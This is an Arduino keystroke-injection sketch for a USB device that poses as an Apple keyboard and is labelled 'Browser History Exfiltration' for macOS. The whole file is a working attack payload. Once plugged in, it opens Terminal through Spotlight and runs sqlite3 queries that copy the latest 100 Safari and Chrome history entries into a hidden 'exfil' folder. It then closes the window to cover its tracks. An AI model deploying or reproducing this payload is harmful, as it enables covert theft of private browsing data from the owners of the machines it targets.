#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Export browser history from Safari and Chrome
  // Saves to ~/Documents/exfil/browser_history/
  // Author: Generated
  // Title: Browser History Exfiltration
  // Target: macOS
  // Version: 1.0
  // Category: Exfiltration
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil/browser_history");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sqlite3 ~/Library/Safari/History.db \"SELECT visit_time, title, url FROM history_items JOIN history_visits ON history_items.id = history_visits.history_item_id ORDER BY visit_time DESC LIMIT 100;\" > ~/Documents/exfil/browser_history/safari_history.txt 2>/dev/null");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/History \"SELECT last_visit_time, title, url FROM urls ORDER BY last_visit_time DESC LIMIT 100;\" > ~/Documents/exfil/browser_history/chrome_history.txt 2>/dev/null");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("ls -la ~/Documents/exfil/browser_history/");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}